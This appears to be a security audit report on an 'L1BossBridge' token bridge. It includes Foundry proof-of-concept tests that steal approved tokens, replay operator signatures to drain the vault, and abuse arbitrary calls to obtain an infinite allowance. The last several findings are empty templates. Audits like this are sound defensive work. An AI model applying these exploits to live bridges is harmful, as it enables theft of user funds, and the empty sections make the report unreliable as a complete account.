### [H-1] Users who give tokens approvals to `L1BossBridge` may have those assets stolen

**Description:** The `depositTokensToL2` function allows anyone to call it with a from address of any account that has approved tokens to the bridge.

As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero.

**Impact:** This will move the tokens into the bridge vault, and assign them to the attacker's address in L2 (setting an attacker-controlled address in the l2Recipient parameter).

As a PoC, include the following test in the `L1BossBridge.t.sol` file:

```javascript
function testCanMoveApprovedTokensOfOtherUsers() public {
    vm.prank(user); // The user is impersonated to execute the next transaction.
    token.approve(address(tokenBridge), type(uint256).max); // The user approves the tokenBridge contract to spend an unlimited amount of their tokens (type(uint256).max).

    uint256 depositAmount = token.balanceOf(user); // Retrieves the total token balance of the user. This will be the amount the attacker attempts to transfer.
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge)); // Prepares the test to expect an event (Deposit) emitted by the tokenBridge contract. This event likely records the user as the source of the deposit, attackerInL2 as the L2 recipient, and depositAmount as the amount.
    emit Deposit(user, attackerInL2, depositAmount);
    tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount); // The attacker uses the tokenBridge contract to move the user's tokens to an L2 address controlled by the attacker (attackerInL2).

    assertEq(token.balanceOf(user), 0);
    assertEq(token.balanceOf(address(vault)), depositAmount); // Verifies that the deposited tokens are now stored in the vault (or the contract handling the tokens for the bridge).
    vm.stopPrank();
}
```

**Proof of Concept:**

**Recommended Mitigation:**
Consider modifying the depositTokensToL2 function so that the caller cannot specify a from address.

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```

### [H-2] Calling `depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens

**Description:** `depositTokensToL2` function allows the caller to specify the from address, from which tokens are taken.

Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the `depositTokensToL2` function and transfer tokens from the vault to the vault itself.

**Impact:** This would allow the attacker to trigger the Deposit event any number of times, presumably causing the minting of unbacked tokens in L2.

Additionally, they could mint all the tokens to themselves.

**Proof of Concept:** As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

```javascript
function testCanTransferFromVaultToVault() public {
    vm.startPrank(attacker);

    // assume the vault already holds some tokens
    uint256 vaultBalance = 500 ether;
    deal(address(token), address(vault), vaultBalance);

    // Can trigger the `Deposit` event self-transferring tokens in the vault
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    // Any number of times
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    vm.stopPrank();
}
```

**Recommended Mitigation:** As suggested in H-1, consider modifying the `depositTokensToL2` function so that the caller cannot specify a from address.

### [H-3] Lack of replay protection in `withdrawTokensToL1` allows withdrawals by signature to be replayed

**Description:** Users who want to withdraw tokens from the bridge can call the sendToL1 function, or the wrapper `withdrawTokensToL1` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.

However, the signatures do not include any kind of replay-protection mechanisn (e.g., nonces). Therefore, valid signatures from any bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.

**Impact:**

**Proof of Concept:** As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

```javascript
function testCanReplayWithdrawals() public {
    // Assume the vault already holds some tokens
    uint256 vaultInitialBalance = 1000e18;
    uint256 attackerInitialBalance = 100e18;
    deal(address(token), address(vault), vaultInitialBalance);
    deal(address(token), address(attacker), attackerInitialBalance);

    // An attacker deposits tokens to L2
    vm.startPrank(attacker);
    token.approve(address(tokenBridge), type(uint256).max);
    tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitialBalance);

    // Operator signs withdrawal.
    (uint8 v, bytes32 r, bytes32 s) =
        _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitialBalance), operator.key);

    // The attacker can reuse the signature and drain the vault.
    while (token.balanceOf(address(vault)) > 0) {
        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
    }
    assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
    assertEq(token.balanceOf(address(vault)), 0);
}
```

**Recommended Mitigation:** Consider redesigning the withdrawal mechanism so that it includes replay protection.

### [H-4] ``L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds

**Description:** The `L1BossBridge` contract includes the `sendToL1` function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract.

The `L1BossBridge` contract owns the `L1Vault` contract. Therefore, an attacker could submit a call that targets the vault and executes is `approveTo` function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.

**Impact:** It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that "the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge". As the next PoC shows, such validation is not enough to prevent the attack.

**Proof of Concept:** To reproduce, include the following test in the `L1BossBridge.t.sol` file:

```javascript
function testCanCallVaultApproveFromBridgeAndDrainVault() public {
    uint256 vaultInitialBalance = 1000e18;
    deal(address(token), address(vault), vaultInitialBalance);

    // An attacker deposits tokens to L2. We do this under the assumption that the
    // bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(attacker), address(0), 0);
    tokenBridge.depositTokensToL2(attacker, address(0), 0);

    // Under the assumption that the bridge operator doesn't validate bytes being signed
    bytes memory message = abi.encode(
        address(vault), // target
        0, // value
        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
    );
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    tokenBridge.sendToL1(v, r, s, message);
    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
}
```

**Recommended Mitigation:** Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the L1Vault contract.

### [H-5] CREATE opcode does not work on zksync era

**Description:**

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

### [H-6] ``L1BossBridge::depositTokensToL2's` DEPOSIT_LIMIT check allows contract to be DoS'd

**Description:**

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

### [H-7] The `L1BossBridge::withdrawTokensToL1` function has no validation on the withdrawal amount being the same as the deposited amount in `L1BossBridge::depositTokensToL2`, allowing attacker to withdraw more funds than deposited

**Description:**

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

### [H-8] `TokenFactory::deployToken` locks tokens forever

**Description:**

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

### [M-1] Withdrawals are prone to unbounded gas consumption due to return bombs

**Description:** During withdrawals, the L1 part of the bridge executes a low-level call to an arbitrary target passing all available gas. While this would work fine for regular targets, it may not for adversarial ones.

In particular, a malicious target may drop a return bomb to the caller. This would be done by returning an large amount of returndata in the call, which Solidity would copy to memory, thus increasing gas costs due to the expensive memory operations. Callers unaware of this risk may not set the transaction's gas limit sensibly, and therefore be tricked to spent more ETH than necessary to execute the call.

If the external call's returndata is not to be used, then consider modifying the call to avoid copying any of the data. This can be done in a custom implementation, or reusing external libraries such as this one.

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**
